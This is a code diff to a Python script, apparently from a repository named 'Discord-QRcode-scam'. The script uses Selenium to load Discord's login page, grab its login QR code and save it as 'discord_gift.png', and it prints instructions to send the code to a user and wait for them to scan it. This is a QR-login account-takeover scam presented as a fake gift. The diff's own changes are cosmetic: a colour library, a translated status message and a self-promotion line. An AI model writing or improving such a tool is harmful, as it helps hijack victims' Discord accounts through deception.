@@ -1,3 +1,5 @@
+from colorama import Fore, init
+init()
 from bs4 import BeautifulSoup
 from selenium import webdriver
 from PIL import Image
@@ -30,7 +32,7 @@ def main():
 
     driver.get("https://discord.com/login")
     time.sleep(5)
-    print("\n- Старница загружена.")
+    print("\n- Page loaded.")
 
     page_source = driver.page_source
 
@@ -52,6 +54,7 @@ def main():
     time.sleep(3)
     print("- QR code generated!\n> discord_gift.png")
     print("Send the QR code to the user. Wait for it to scan it...")
+    print("\nRate me!{} At https://github.com/Jupiter404E/Discord-QRcode-scam\n".format(Fore.WHITE))
 
 if __name__ == "__main__":
     main()
